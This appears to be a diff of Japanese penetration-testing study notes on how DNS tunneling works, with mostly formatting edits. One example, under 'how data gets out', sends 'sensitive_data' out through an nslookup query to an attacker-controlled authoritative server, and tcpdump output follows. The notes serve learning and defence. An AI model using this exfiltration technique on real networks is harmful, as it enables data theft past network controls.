@@ -290,14 +290,17 @@ ssh <user>@240.0.0.1
 
 ## DNS Tunnelingの原理
 
-- DNS server（権威サーバー）を支配下に置く必要がある
-- 解説にあたっての前提：
+- 条件：DNS server（権威サーバー）を支配下に置く
+
+- 原理解説にあたっての前提：
 	- ローカルNWからはWAN上にあるマシンに直接アクセスできない（下図Jump Host)
 	- DNSリゾルバ（名前解決を請け負う）がローカルNWと通信可能（下図DNS resolver）
 	- 権威サーバー(名前解決情報を持つ)がWANにある（下図DNS server）
 
-- 留意点：DNSは１つのパケットで少量のデータしかやり取りできないので、大きなデータは複数バイトに分割してやり取りしており、データのドロップが発生する可能性がある
 - 参考記事：🔗[ChamelDoH インプラント ～DNSトンネリング or DNS over HTTPS (DoH) ?～ - NECセキュリティブログ](https://jpn.nec.com/cybersecurity/blog/240920/index.html)
+
+ >[!Warning]
+ >DNSは１つのパケットで少量のデータしかやり取りできないので、大きなデータは複数バイトに分割してやり取りしており、データのドロップが発生する可能性がある。
 
 ### データが外に出る仕組み
 
@@ -305,7 +308,7 @@ ssh <user>@240.0.0.1
 ```zsh
 nslookup sensitive_data.domain.com
 ```
-- ↓ローカルNWからWAN上の権威サーバーにデータが流出する
+- ↓　ローカルNWからWAN上の権威サーバーにデータが流出する
 ```zsh
 ...
 04:57:40.721682 IP <DNS_resolver_IP>.65122 > <DNS_server_IP>.domain: 26234+ [1au] A? sensitive_data.domain.com. (57)
@@ -326,7 +329,7 @@ Non-authoritative answer:
 
 ![](../../../画像ファイル/Pasted%20image%2020260315104051.png)
 
-$$DNSリゾルバを介してデータが漏洩・侵入するイメージ(PEN-200)$$
+$$DNSリゾルバを介してデータが漏洩・侵入するイメージ$$
 
 ## DNS Tunneling w/ Dnscat2
 
